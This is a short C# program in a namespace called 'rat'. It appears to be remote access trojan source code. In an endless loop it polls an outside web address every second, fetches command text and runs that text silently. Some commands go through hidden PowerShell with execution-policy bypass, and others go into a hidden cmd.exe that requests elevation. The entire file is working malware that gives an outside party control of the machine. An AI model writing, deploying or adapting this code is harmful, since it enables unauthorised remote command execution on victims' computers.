using System;
using System.Net;
using System.Diagnostics;
using System.Threading;
using System.IO;

namespace rat
{
    class Program
    {
        static void Main(string[] args)
        {
            string json = "";
            string oldjson = "as";
            int chk = 0;
            while (chk == 0)
            {
                try
                {
                    json = new WebClient().DownloadString("https://r.significantbyte.com/go.php");
                    if (json != oldjson)
                    {

                        if (json.Contains("curl.exe"))
                        {
                            System.Diagnostics.Process.Start("CMD.exe", "/C powershell -w h -ep bypass " + json);
                        }
                        else
                        {
                            Process cmd = new Process();
                            cmd.StartInfo.FileName = "cmd.exe";
                            cmd.StartInfo.RedirectStandardInput = true;
                            cmd.StartInfo.RedirectStandardOutput = true;
                            cmd.StartInfo.CreateNoWindow = true;
                            cmd.StartInfo.UseShellExecute = false;

                            cmd.StartInfo.Verb = "runas";
                            cmd.Start();

                            cmd.StandardInput.WriteLine(json);
                        }

                        Console.WriteLine("diff result json=" + json + "old=" + oldjson);
                    }
                    else
                    {
                        Console.WriteLine("same result json=" + json + "old=" + oldjson);
                    }


                    oldjson = json;
                }
                catch (Exception e)
                {
                    Console.WriteLine("Connection not stable.");
                }
                Thread.Sleep(1000);

            }

        }
    }
}